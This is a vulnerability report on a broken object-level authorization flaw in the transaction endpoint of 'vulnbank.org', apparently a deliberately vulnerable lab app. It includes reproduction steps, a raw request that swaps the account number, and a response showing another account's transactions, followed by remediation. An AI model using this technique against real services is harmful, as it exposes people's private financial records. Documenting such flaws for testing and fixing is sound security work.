# Broken Object Level Authorization (BOLA) on Transaction History

- **Vulnerability Type:** Broken Object Level Authorization (BOLA) / CWE-639
- **Target / Platform:** `vulnbank.org`
- **Severity / CVSS:** High
- **Affected Endpoint:** `GET /transactions/{account_number}`

---

## Description

The application exposes transaction history through a user-controlled path parameter: `account_number`. Although the requester is authenticated, the server does not verify whether the requested account belongs to the authenticated user.

As a result, any authenticated user can change the account number in the request path and access transaction history belonging to another account. This is a classic object-level authorization flaw, where access control is enforced for authentication but not for object ownership.

---

## Impact

A successful attacker can read transaction history belonging to other users without permission. This may expose sensitive financial activity, account identifiers, transfer patterns, and other private metadata.

In a real-world banking environment, this issue could lead to privacy violations, account enumeration, targeted fraud, social engineering, and broader compromise of user trust.

---

## Proof of Concept

### Steps to Reproduce

1. Log in using a normal user account.
2. Intercept the request to the transaction history endpoint.
3. Change the account number in the URL path to another valid account number.
4. Forward the request.
5. Observe that the server returns transaction history for the modified account number.

### Raw HTTP Request

```http
GET /transactions/8058997464 HTTP/1.1
Host: 127.0.0.1
Authorization: Bearer <valid_user_jwt>
Cookie: token=<valid_user_jwt>
Accept: */*
Referer: http://127.0.0.1/dashboard
Connection: keep-alive
```

### Raw HTTP Response

```http
HTTP/1.0 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *
Server: Werkzeug/2.0.1 Python/3.9.25

{
  "account_number": "8058997464",
  "status": "success",
  "transactions": [
    {
      "id": 60,
      "type": "transfer",
      "from_account": "8058997464",
      "to_account": "8058997464",
      "amount": 10.0,
      "description": "nohh"
    },
    {
      "id": 59,
      "type": "virtual_card_funding",
      "from_account": "8058997464",
      "to_account": "5935728866746376",
      "amount": 1.0,
      "description": "Funded BTC virtual card from main balance: $1.00 @ 1.4e-05 -> BTC 1.4e-05"
    },
    {
      "id": 41,
      "type": "transfer",
      "from_account": "8058997464",
      "to_account": "1500",
      "amount": -1500.0,
      "description": ""
    },
    {
      "id": 16,
      "type": "Telecommunications",
      "from_account": "8058997464",
      "to_account": "TEL001",
      "amount": -10000.0,
      "description": "Bill Payment"
    }
  ]
}
```

---

## Root Cause

The server trusts the `account_number` parameter without checking whether the authenticated user is the owner of that object. Authentication is present, but object-level authorization is missing.

---

## Evidence

- The endpoint returns `200 OK` even when the account number is changed.
- The response contains transaction data for the requested account.
- The returned object includes sensitive transaction history and account metadata.

---

## Attack Flow

```text
Authenticated User
        │
        ▼
Intercept Request
        │
        ▼
Change /transactions/{account_number}
        │
        ▼
Send Request
        │
        ▼
Server Returns Another User's Transactions
```

---

## Remediation

- Enforce object-level authorization on every request that references a user-owned resource.
- Verify that the authenticated user is the owner of the requested `account_number`.
- Do not rely on client-supplied identifiers alone for access decisions.
- Return `403 Forbidden` when the requested object does not belong to the authenticated user.
- Apply centralized authorization checks consistently across all sensitive endpoints.

---

## References

- OWASP API Security Top 10 — Broken Object Level Authorization
- CWE-639 — Authorization Bypass Through User-Controlled Key

---

## Notes

This issue is not a missing authentication problem. The user is authenticated, but the server fails to validate ownership of the object being accessed. That distinction is what makes this a BOLA issue rather than a simple unauthenticated access bug.
